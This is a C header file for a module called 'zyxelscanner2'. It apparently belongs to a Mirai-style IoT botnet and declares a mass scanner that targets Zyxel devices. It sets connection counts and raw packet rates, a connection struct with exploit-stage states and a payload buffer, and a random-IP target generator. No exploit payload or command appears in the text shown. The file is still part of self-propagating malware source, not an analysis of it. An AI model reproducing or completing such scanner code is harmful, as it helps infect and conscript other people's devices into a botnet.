#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define zyxelscanner2_SCANNER_MAX_CONNS 512
#define zyxelscanner2_SCANNER_RAW_PPS 1440
#else
#define zyxelscanner2_SCANNER_MAX_CONNS 256
#define zyxelscanner2_SCANNER_RAW_PPS 1024
#endif

#ifdef X86_64
#define zyxelscanner2_SCANNER_RDBUF_SIZE 1024
#define zyxelscanner2_SCANNER_HACK_DRAIN 64
#else
#define zyxelscanner2_SCANNER_RDBUF_SIZE 1024
#define zyxelscanner2_SCANNER_HACK_DRAIN 64
#endif

struct zyxelscanner2_scanner_connection
{
    int fd, last_recv;
    enum
    {
        zyxelscanner2_SC_CLOSED,
        zyxelscanner2_SC_CONNECTING,
        zyxelscanner2_SC_EXPLOIT_STAGE2,
        zyxelscanner2_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[zyxelscanner2_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
};

void zyxelscanner2_scanner_init();
void zyxelscanner2_scanner_kill(void);

static void zyxelscanner2_setup_connection(struct zyxelscanner2_scanner_connection *);
static ipv4_t zyxelscanner2_get_random_ip(void);

